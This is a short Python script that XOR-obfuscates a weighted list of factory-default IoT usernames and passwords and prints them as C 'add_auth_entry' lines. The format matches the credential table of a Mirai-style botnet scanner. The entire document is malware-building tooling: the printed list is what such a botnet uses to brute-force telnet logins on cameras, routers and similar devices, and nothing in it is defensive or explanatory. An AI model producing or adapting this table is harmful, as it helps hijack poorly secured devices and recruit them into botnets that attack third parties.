
def xor_0x07(s):
    return ''.join(['\\x{:02x}'.format(ord(c) ^ 0x07) for c in s])

combos = [
    ('root', 'xc3511', 5),
    ('root', 'vizxv', 5),
    ('root', 'admin', 5),
    ('user', 'user', 5),
    ('admin', 'admin', 4),
    ('root', '888888', 2),
    ('ubuntu', 'ubuntu', 4),
    ('root', 'xmhdipc', 3),
    ('root', 'default', 3),
    ('root', '123456', 3),
    ('root', '54321', 2),
    ('support', 'support', 3),
    ('root', '', 4),
    ('admin', 'password', 5),
    ('root', 'root', 5),
    ('root', '12345', 4),
    ('default', 'default', 4),
    ('user', 'user', 3),
    ('admin', '', 5),
    ('root', 'realtek', 5),
    ('root', 'pass', 5),
    ('admin', 'smcadmin', 3),
    ('root', 'password', 5),
    ('root', '1234', 2),
    ('root', 'klv123', 2),
    ('telecomadmin', 'admintelecom', 2),
    ('guest', 'guest', 5),
    ('guest', '12345', 3),
    ('ubnt', 'ubnt', 3),
    ('root', 'klv1234', 2),
    ('root', 'Zte521', 2),
    ('root', 'hi3518', 2),
    ('root', 'jvbzd', 2),
    ('root', 'anko', 2),
    ('root', 'zlxx.', 2),
    ('admin', '123456', 3),
    ('admin', '1234', 4),
    ('daemon', '', 2)
]

for user, pw, weight in combos:
    print(f'    add_auth_entry(\"{xor_0x07(user)}\", \"{xor_0x07(pw)}\", {weight}); // {user}:{pw}')
